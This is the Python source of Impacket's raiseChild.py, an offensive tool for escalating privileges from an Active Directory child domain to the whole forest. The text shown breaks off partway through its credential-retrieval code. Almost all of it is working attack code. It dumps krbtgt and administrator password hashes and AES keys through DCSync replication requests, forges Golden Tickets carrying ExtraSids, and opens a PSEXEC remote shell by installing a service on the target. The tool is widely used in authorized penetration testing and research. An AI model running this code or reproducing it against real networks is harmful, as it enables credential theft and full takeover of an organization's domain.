#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script implements a child-domain to forest privilege escalation
#   as detailed by Sean Metcalf (@PyroTek3) at https://adsecurity.org/?p=1640. We will
#   be (ab)using the concept of Golden Tickets and ExtraSids researched and implemented
#   by Benjamin Delpy (@gentilkiwi) in mimikatz (https://github.com/gentilkiwi/mimikatz).
#   The idea of automating all these tasks came from @mubix.
#
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
#
#   IMPORTANT NOTE: Your machine MUST be able to resolve all the domains from the child domain up to the
#                   forest. Easiest way to do is by adding the forest's DNS to your resolv.conf or similar
#
#   E.G:
#   Just in case, Microsoft says it all (https://technet.microsoft.com/en-us/library/cc759073(v=ws.10).aspx):
#     A forest is the only component of the Active Directory logical structure that is a security boundary.
#     By contrast, a domain is not a security boundary because it is not possible for administrators from one domain
#     to prevent a malicious administrator from another domain within the forest from accessing data in their domain.
#     A domain is, however, the administrative boundary for managing objects, such as users, groups, and computers.
#     In addition, each domain has its own individual security policies and trust relationships with other domains.
#
# Author:
#   Alberto Solino (@agsolino)
#

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import random
import string
import sys
import os
import cmd
import time
from threading import Thread, Lock
from binascii import unhexlify, hexlify
from socket import gethostbyname
from struct import unpack
from six import PY3

try:
    import pyasn1
except ImportError:
     logging.critical('This module needs pyasn1 installed')
     logging.critical('You can get it from https://pypi.python.org/pypi/pyasn1')
     sys.exit(1)
from impacket import version
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
from impacket.krb5.asn1 import AS_REP, AuthorizationData, AD_IF_RELEVANT, EncTicketPart
from impacket.krb5.crypto import Key, _enctype_table, _checksum_table, Enctype
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.ntlm import LMOWFv1, NTOWFv1
from impacket.dcerpc.v5.dtypes import RPC_SID, MAXIMUM_ALLOWED
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx
from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, POLICY_LOOKUP_NAMES, LSAP_LOOKUP_LEVEL, hLsarLookupSids
from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS, hLsarOpenPolicy2
from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, \
    PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, VALIDATION_INFO
from impacket.dcerpc.v5 import transport, drsuapi, epm, samr
from impacket.smbconnection import SessionError
from impacket.nt_errors import STATUS_NO_LOGON_SERVERS
from impacket.smbconnection import SMBConnection, smb
from impacket.structure import Structure
from impacket.examples import remcomsvc, serviceinstall

################################################################################
# HELPER FUNCTIONS
################################################################################

class RemComMessage(Structure):
    structure = (
        ('Command','4096s=""'),
        ('WorkingDir','260s=""'),
        ('Priority','<L=0x20'),
        ('ProcessID','<L=0x01'),
        ('Machine','260s=""'),
        ('NoWait','<L=0'),
    )

class RemComResponse(Structure):
    structure = (
        ('ErrorCode','<L=0'),
        ('ReturnCode','<L=0'),
    )

RemComSTDOUT         = "RemCom_stdout"
RemComSTDIN          = "RemCom_stdin"
RemComSTDERR         = "RemCom_stderr"

lock = Lock()

class PSEXEC:
    def __init__(self, command, username, domain, smbConnection, TGS, copyFile):
        self.__username = username
        self.__command = command
        self.__path = None
        self.__domain = domain
        self.__exeFile = None
        self.__copyFile = copyFile
        self.__TGS = TGS
        self.__smbConnection = smbConnection

    def run(self, addr):
        rpctransport = transport.SMBTransport(addr, filename='/svcctl', smb_connection=self.__smbConnection)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        global dialect
        dialect = rpctransport.get_smb_connection().getDialect()

        try:
            unInstalled = False
            s = rpctransport.get_smb_connection()

            # We don't wanna deal with timeouts from now on.
            s.setTimeout(100000)
            if self.__exeFile is None:
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), remcomsvc.RemComSvc())
            else:
                try:
                    f = open(self.__exeFile, 'rb')
                except Exception as e:
                    logging.critical(str(e))
                    sys.exit(1)
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)
    
            installService.install()

            if self.__exeFile is not None:
                f.close()

            # Check if we need to copy a file for execution
            if self.__copyFile is not None:
                installService.copy_file(self.__copyFile, installService.getShare(), os.path.basename(self.__copyFile))
                # And we change the command to be executed to this filename
                self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command

            tid = s.connectTree('IPC$')
            fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)

            packet = RemComMessage()
            pid = os.getpid()

            packet['Machine'] = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
            if self.__path is not None:
                packet['WorkingDir'] = self.__path
            packet['Command'] = self.__command
            packet['ProcessID'] = pid

            s.writeNamedPipe(tid, fid_main, packet.getData())

            # Here we'll store the command we type so we don't print it back ;)
            # ( I know.. globals are nasty :P )
            global LastDataSent
            LastDataSent = ''

            # Create the pipes threads
            stdin_pipe = RemoteStdInPipe(rpctransport,
                                         r'\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
                                         smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS,
                                         installService.getShare())
            stdin_pipe.start()
            stdout_pipe = RemoteStdOutPipe(rpctransport,
                                           r'\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
                                           smb.FILE_READ_DATA)
            stdout_pipe.start()
            stderr_pipe = RemoteStdErrPipe(rpctransport,
                                           r'\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
                                           smb.FILE_READ_DATA)
            stderr_pipe.start()
            
            # And we stay here till the end
            ans = s.readNamedPipe(tid,fid_main,8)

            if len(ans):
                retCode = RemComResponse(ans)
                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (
                self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
            installService.uninstall()
            if self.__copyFile is not None:
                # We copied a file for execution, let's remove it
                s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            unInstalled = True
            sys.exit(retCode['ErrorCode'])

        except SystemExit:
            raise
        except Exception as e:
            logging.debug(str(e))
            if unInstalled is False:
                installService.uninstall()
                if self.__copyFile is not None:
                    s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            sys.stdout.flush()
            sys.exit(1)

    def openPipe(self, s, tid, pipe, accessMask):
        pipeReady = False
        tries = 50
        while pipeReady is False and tries > 0:
            try:
                s.waitNamedPipe(tid,pipe)
                pipeReady = True
            except:
                tries -= 1
                time.sleep(2)
                pass

        if tries == 0:
            raise Exception('Pipe not ready, aborting')

        fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)

        return fid

class Pipes(Thread):
    def __init__(self, transport, pipe, permissions, TGS=None, share=None):
        Thread.__init__(self)
        self.server = 0
        self.transport = transport
        self.credentials = transport.get_credentials()
        self.tid = 0
        self.fid = 0
        self.share = share
        self.port = transport.get_dport()
        self.pipe = pipe
        self.permissions = permissions
        self.TGS = TGS
        self.daemon = True

    def connectPipe(self):
        try:
            lock.acquire()
            global dialect
            self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(),
                                        sess_port=self.port, preferredDialect=dialect)
            user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
            self.server.login(user, passwd, domain, lm, nt)
            lock.release()
            self.tid = self.server.connectTree('IPC$') 

            self.server.waitNamedPipe(self.tid, self.pipe)
            self.fid = self.server.openFile(self.tid,self.pipe,self.permissions, creationOption = 0x40, fileAttributes = 0x80)
            self.server.setTimeout(1000000)
        except Exception:
            logging.critical("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)

class RemoteStdOutPipe(Pipes):
    def __init__(self, transport, pipe, permisssions):
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        self.connectPipe()
        while True:
            try:
                ans = self.server.readFile(self.tid,self.fid, 0, 1024)
            except:
                pass
            else:
                try:
                    global LastDataSent
                    if ans != LastDataSent:
                        sys.stdout.write(ans.decode('cp437'))
                        sys.stdout.flush()
                    else:
                        # Don't echo what I sent, and clear it up
                        LastDataSent = ''
                    # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars,
                    # it will give false positives tho.. we should find a better way to handle this.
                    if LastDataSent > 10:
                        LastDataSent = ''
                except:
                    pass

class RemoteStdErrPipe(Pipes):
    def __init__(self, transport, pipe, permisssions):
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        self.connectPipe()
        while True:
            try:
                ans = self.server.readFile(self.tid,self.fid, 0, 1024)
            except:
                pass
            else:
                try:
                    sys.stderr.write(str(ans))
                    sys.stderr.flush()
                except:
                    pass

class RemoteShell(cmd.Cmd):
    def __init__(self, server, port, credentials, tid, fid, TGS, share):
        cmd.Cmd.__init__(self, False)
        self.prompt = '\x08'
        self.server = server
        self.transferClient = None
        self.tid = tid
        self.fid = fid
        self.credentials = credentials
        self.share = share
        self.port = port
        self.TGS = TGS
        self.intro = '[!] Press help for extra shell commands'

    def connect_transferClient(self):
        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port=self.port,
                                            preferredDialect=dialect)
        user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
        self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)

    def do_help(self, line):
        print("""
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)
 get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir 
 ! {cmd}                    - executes a local shell cmd
""" % (self.share, self.share))
        self.send_data('\r\n', False)

    def do_shell(self, s):
        os.system(s)
        self.send_data('\r\n')

    def do_get(self, src_path):
        try:
            if self.transferClient is None:
                self.connect_transferClient()

            import ntpath
            filename = ntpath.basename(src_path)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (self.share, src_path))
            self.transferClient.getFile(self.share, src_path, fh.write)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            pass

        self.send_data('\r\n')
 
    def do_put(self, s):
        try:
            if self.transferClient is None:
                self.connect_transferClient()
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = '/'

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            f = dst_path + '/' + src_file
            pathname = f.replace('/','\\')
            logging.info("Uploading %s to %s\\%s" % (src_file, self.share, dst_path))
            if PY3:
                self.transferClient.putFile(self.share, pathname, fh.read)
            else:
                self.transferClient.putFile(self.share, pathname.decode(sys.stdin.encoding), fh.read)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            pass

        self.send_data('\r\n')


    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))
        self.send_data('\r\n')

    def emptyline(self):
        self.send_data('\r\n')
        return

    def default(self, line):
        if PY3:
            self.send_data(line.encode('cp437')+b'\r\n')
        else:
            self.send_data(line.decode(sys.stdin.encoding).encode('cp437')+'\r\n')

    def send_data(self, data, hideOutput = True):
        if hideOutput is True:
            global LastDataSent
            LastDataSent = data
        else:
            LastDataSent = ''
        self.server.writeFile(self.tid, self.fid, data)

class RemoteStdInPipe(Pipes):
    def __init__(self, transport, pipe, permisssions, TGS=None, share=None):
        Pipes.__init__(self, transport, pipe, permisssions, TGS, share)

    def run(self):
        self.connectPipe()
        shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.TGS, self.share)
        shell.cmdloop()

class RAISECHILD:
    def __init__(self, target = None, username = '', password = '', domain='', options = None, command=''):
        self.__rid = 0
        self.__targetRID = options.targetRID
        self.__target = target
        self.__kdcHost = None
        self.__command = command
        self.__writeTGT = options.w
        self.__domainSid = ''
        self.__doKerberos = options.k
        self.__drsr = None
        self.__ppartialAttrSet = None
        self.__creds = {}

        self.__creds['username'] = username
        self.__creds['password'] = password
        self.__creds['domain'] = domain
        self.__creds['lmhash'] = ''
        self.__creds['nthash'] = ''
        self.__creds['aesKey'] = options.aesKey
        self.__creds['TGT'] =  None
        self.__creds['TGS'] =  None

        #if options.dc_ip is not None:
        #    self.__kdcHost = options.dc_ip
        #else:
        #    self.__kdcHost = domain
        self.__kdcHost = None

        if options.hashes is not None:
            lmhash, nthash = options.hashes.split(':')
            self.__creds['lmhash'] = unhexlify(lmhash)
            self.__creds['nthash'] = unhexlify(nthash)

        # Transform IP addresses into FQDNs
        if self.__target is not None:
            self.__target = self.getDNSMachineName(self.__target)
            logging.debug('getDNSMachineName for %s returned %s' % (target, self.__target))

    NAME_TO_ATTRTYP = {
        'objectSid': 0x90092,
        'userPrincipalName': 0x90290,
        'sAMAccountName': 0x900DD,
        'unicodePwd': 0x9005A,
        'dBCSPwd': 0x90037,
        'supplementalCredentials': 0x9007D,
    }

    ATTRTYP_TO_ATTID = {
        'objectSid': '1.2.840.113556.1.4.146',
        'userPrincipalName': '1.2.840.113556.1.4.656',
        'sAMAccountName': '1.2.840.113556.1.4.221',
        'unicodePwd': '1.2.840.113556.1.4.90',
        'dBCSPwd': '1.2.840.113556.1.4.55',
        'supplementalCredentials': '1.2.840.113556.1.4.125',
    }

    KERBEROS_TYPE = {
        1:'dec-cbc-crc',
        3:'des-cbc-md5',
        17:'aes128-cts-hmac-sha1-96',
        18:'aes256-cts-hmac-sha1-96',
        0xffffff74:'rc4_hmac',
    }

    HMAC_SHA1_96_AES256 = 0x10

    def getChildInfo(self, creds):
        logging.debug('Calling NRPC DsrGetDcNameEx()')
        target = creds['domain']
        if self.__doKerberos is True:
            # In Kerberos we need the target's name
            machineNameOrIp = self.getDNSMachineName(gethostbyname(target))
            logging.debug('%s is %s' % (gethostbyname(target), machineNameOrIp))
        else:
            machineNameOrIp = target

        stringBinding = r'ncacn_np:%s[\pipe\netlogon]' % machineNameOrIp

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], creds['lmhash'],
                                         creds['nthash'], creds['aesKey'])
            if self.__doKerberos or creds['aesKey'] is not None:
                rpctransport.set_kerberos(True)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(MSRPC_UUID_NRPC)

        resp = hDsrGetDcNameEx(dce, NULL, NULL, NULL, NULL, 0)
        #resp.dump()
        return resp['DomainControllerInfo']['DomainName'][:-1], resp['DomainControllerInfo']['DnsForestName'][:-1]

    @staticmethod
    def getMachineName(machineIP):
        s = SMBConnection(machineIP, machineIP)
        try:
            s.login('','')
        except Exception:
            logging.debug('Error while anonymous logging into %s' % machineIP)
        else:
            s.logoff()
        return s.getServerName()

    @staticmethod
    def getDNSMachineName(machineIP):
        s = SMBConnection(machineIP, machineIP)
        try:
            s.login('','')
        except Exception:
            logging.debug('Error while anonymous logging into %s' % machineIP)
        else:
            s.logoff()
        return s.getServerName() + '.' + s.getServerDNSDomainName()

    def getParentSidAndTargetName(self, parentDC, creds, targetRID):
        if self.__doKerberos is True:
            # In Kerberos we need the target's name
            machineNameOrIp = self.getDNSMachineName(gethostbyname(parentDC))
            logging.debug('%s is %s' % (gethostbyname(parentDC), machineNameOrIp))
        else:
            machineNameOrIp = gethostbyname(parentDC)

        logging.debug('Calling LSAT hLsarQueryInformationPolicy2()')
        stringBinding = r'ncacn_np:%s[\pipe\lsarpc]' % machineNameOrIp

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], creds['lmhash'],
                                         creds['nthash'], creds['aesKey'])
            rpctransport.set_kerberos(self.__doKerberos)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(MSRPC_UUID_LSAT)

        resp = hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']

        resp = hLsarQueryInformationPolicy2(dce, policyHandle, POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)

        domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()

        # Now that we have the Sid, let's get the Administrator's account name
        sids = list()
        sids.append(domainSid+'-'+targetRID)
        resp = hLsarLookupSids(dce, policyHandle, sids, LSAP_LOOKUP_LEVEL.LsapLookupWksta)
        targetName = resp['TranslatedNames']['Names'][0]['Name']

        return domainSid, targetName

    def __connectDrds(self, domainName, creds):
        if self.__doKerberos is True or creds['TGT'] is not None:
            # In Kerberos we need the target's name
            machineNameOrIp = self.getDNSMachineName(gethostbyname(domainName))
            logging.debug('%s is %s' % (gethostbyname(domainName), machineNameOrIp))
        else:
            machineNameOrIp = gethostbyname(domainName)
        stringBinding = epm.hept_map(machineNameOrIp, drsuapi.MSRPC_UUID_DRSUAPI,
                                     protocol='ncacn_ip_tcp')
        rpc = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpc, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            if creds['TGT'] is not None:
                rpc.set_credentials(creds['username'],'', creds['domain'], TGT=creds['TGT'])
                rpc.set_kerberos(True)
            else:
                rpc.set_credentials(creds['username'], creds['password'], creds['domain'], creds['lmhash'],
                                    creds['nthash'], creds['aesKey'])
                rpc.set_kerberos(self.__doKerberos)
        self.__drsr = rpc.get_dce_rpc()
        self.__drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        if self.__doKerberos or creds['TGT'] is not None:
            self.__drsr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__drsr.connect()
        self.__drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs) #- 4
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 |\
                         drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = drsuapi.NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = drsuapi.NULLGUID
        drs['dwExtCaps'] = 127
        request['pextClient']['cb'] = len(drs.getData())
        request['pextClient']['rgb'] = list(drs.getData())
        resp = self.__drsr.request(request)

        # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
        # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

        # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
        ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
        len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
        drsExtensionsInt.fromString(ppextServer)

        if drsExtensionsInt['dwReplEpoch'] != 0:
            # Different epoch, we have to call DRSBind again
            if logging.getLogger().level == logging.DEBUG:
                logging.debug("DC's dwReplEpoch != 0, setting it to %d and calling DRSBind again" % drsExtensionsInt[
                    'dwReplEpoch'])
            drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(drs.getData())
            resp = self.__drsr.request(request)

        self.__hDrs = resp['phDrs']

        # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
        resp = drsuapi.hDRSDomainControllerInfo(self.__drsr, self.__hDrs, domainName, 2)

        if resp['pmsgOut']['V2']['cItems'] > 0:
            self.__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
        else:
            logging.error("Couldn't get DC info for domain %s" % domainName)
            raise Exception('Fatal, aborting')

    def DRSCrackNames(self, target, formatOffered=drsuapi.DS_NAME_FORMAT.DS_DISPLAY_NAME,
                      formatDesired=drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name='', creds=None):
        if self.__drsr is None:
            self.__connectDrds(target, creds)

        resp = drsuapi.hDRSCrackNames(self.__drsr, self.__hDrs, 0, formatOffered, formatDesired, (name,))
        return resp

    def __decryptSupplementalInfo(self, record, prefixTable=None):
        # This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
        plainText = None
        for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
            try:
                attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
            except Exception as e:
                logging.debug('Failed to execute OidFromAttid with error %s' % e)
                # Fallbacking to fixed table and hope for the best
                attId = attr['attrTyp']
                LOOKUP_TABLE = self.NAME_TO_ATTRTYP

            if attId == LOOKUP_TABLE['supplementalCredentials']:
                if attr['AttrVal']['valCount'] > 0:
                    blob = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    plainText = drsuapi.DecryptAttributeValue(self.__drsr, blob)
                    if len(plainText) < 24:
                        plainText = None

        if plainText:
            try:
                userProperties = samr.USER_PROPERTIES(plainText)
            except:
                # On some old w2k3 there might be user properties that don't
                # match [MS-SAMR] structure, discarding them
                return
            propertiesData = userProperties['UserProperties']
            for propertyCount in range(userProperties['PropertyCount']):
                userProperty = samr.USER_PROPERTY(propertiesData)
                propertiesData = propertiesData[len(userProperty):]
                if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
                    propertyValueBuffer = unhexlify(userProperty['PropertyValue'])
                    kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
                    data = kerbStoredCredentialNew['Buffer']
                    for credential in range(kerbStoredCredentialNew['CredentialCount']):
                        keyDataNew = samr.KERB_KEY_DATA_NEW(data)
                        data = data[len(keyDataNew):]
                        keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]

                        if  keyDataNew['KeyType'] in self.KERBEROS_TYPE:
                            # Give me only the AES256
                            if keyDataNew['KeyType'] == 18:
                                return hexlify(keyValue)

        return None

    def __decryptHash(self, record, prefixTable=None):
        logging.debug('Decrypting hash for user: %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
        rid = 0
        LMHash = None
        NTHash = None
        for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
            try:
                attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
            except Exception as e:
                logging.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
                # Fallbacking to fixed table and hope for the best
                attId = attr['attrTyp']
                LOOKUP_TABLE = self.NAME_TO_ATTRTYP
            if attId == LOOKUP_TABLE['dBCSPwd']:
                if attr['AttrVal']['valCount'] > 0:
                    encrypteddBCSPwd = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    encryptedLMHash = drsuapi.DecryptAttributeValue(self.__drsr, encrypteddBCSPwd)
                else:
                    LMHash = LMOWFv1('', '')
            elif attId == LOOKUP_TABLE['unicodePwd']:
                if attr['AttrVal']['valCount'] > 0:
                    encryptedUnicodePwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    encryptedNTHash = drsuapi.DecryptAttributeValue(self.__drsr, encryptedUnicodePwd)
                else:
                    NTHash = NTOWFv1('', '')
            elif attId == LOOKUP_TABLE['objectSid']:
                if attr['AttrVal']['valCount'] > 0:
                    objectSid = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    rid = unpack('<L', objectSid[-4:])[0]
                else:
                    raise Exception('Cannot get objectSid for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])

        if LMHash is None:
            LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
        if NTHash is None:
            NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
        return rid, hexlify(LMHash), hexlify(NTHash)

    def DRSGetNCChanges(self, userEntry, creds):
        if self.__drsr is None:
            self.__connectDrds(creds)

        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = self.__hDrs
        request['dwInVersion'] = 8

        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid

        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = drsuapi.NULLGUID
        dsName['Sid'] = ''
        dsName['NameLen'] = len(userEntry)
        dsName['StringName'] = (userEntry + '\x00')

        dsName['structLen'] = len(dsName.getData())

        request['pmsgIn']['V8']['pNC'] = dsName

        request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
        request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0

        request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL

        request['pmsgIn']['V8']['ulFlags'] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
        if self.__ppartialAttrSet is None:
            self.__prefixTable = []
            self.__ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
            self.__ppartialAttrSet['dwVersion'] = 1
            self.__ppartialAttrSet['cAttrs'] = len(self.ATTRTYP_TO_ATTID)
            for attId in list(self.ATTRTYP_TO_ATTID.values()):
                self.__ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(self.__prefixTable , attId))
        request['pmsgIn']['V8']['pPartialAttrSet'] = self.__ppartialAttrSet
        request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(self.__prefixTable)
        request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = self.__prefixTable
        request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL

        return self.__drsr.request(request)

    def getCredentials(self, userName, domain, creds = None):
        upn = '%s@%s' % (userName, domain)
        try:
            crackedName = self.DRSCrackNames(domain, drsuapi.DS_NAME_FORMAT.DS_USER_PRINCIPAL_NAME, name = upn, creds=creds)

            if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] == 0:
                    userRecord = self.DRSGetNCChanges(
                        crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1], creds)
                    # userRecord.dump()
                    if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
                        raise Exception('DRSGetNCChanges didn\'t return any object!')
                else:
                    raise Exception('DRSCrackNames status returned error 0x%x' %
                                    crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'])
            else:
                raise Exception('DRSCrackNames returned %d items for user %s' % (
                crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))

            rid, lmhash, nthash = self.__decryptHash(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
            aesKey = self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
        except Exception as e:
            logging.debug('Exception:', exc_info=True)
            logging.error("Error while processing user!")
            logging.error(str(e))
            raise

        self.__drsr.disconnect()
